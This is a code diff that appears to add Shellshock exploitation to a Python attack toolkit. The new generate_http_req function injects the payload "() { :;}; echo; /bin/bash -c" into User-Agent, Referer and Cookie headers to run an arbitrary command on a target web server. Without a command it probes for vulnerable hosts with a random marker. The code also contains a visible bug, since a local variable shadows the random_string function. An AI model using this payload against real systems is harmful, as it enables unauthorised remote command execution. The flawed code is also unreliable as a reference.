@@ -1149,7 +1149,44 @@ def generate_emails(full_name, domain):
     ]
     
     return permutations
+def clean_url(host):
+    """Verifica si el último carácter es una barra y, de ser así, la elimina"""
+    if host.endswith('/'):
+        host = host.rstrip('/')
+    return host
+    
+def random_string(length=15):
+    """Generates a random alphanumeric string."""
+    letters = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters) for i in range(length))
 
+def generate_http_req(host, port, uri, custom_header=None, cmd=None):
+    """Generates an HTTP request with the Shellshock payload."""
+    if cmd:
+        payload = f'() {{ :;}}; echo; /bin/bash -c "{cmd}"'
+    else:
+        random_string = random_string()
+        payload = f'() {{ :;}}; echo; echo "{random_string}"'
+
+    headers = {}
+    if custom_header is None:
+        headers = {
+            'User-Agent': payload,
+            'Referer': payload,
+            'Cookie': payload
+        }
+    else:
+        headers[custom_header] = payload
+    
+    url = f"{host}:{port}{uri}"
+    print_msg(f"{headers=}")
+    response = requests.get(url, headers=headers)
+
+    if cmd:
+        return response, None
+    else:
+        return response, random_string
+        
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
 
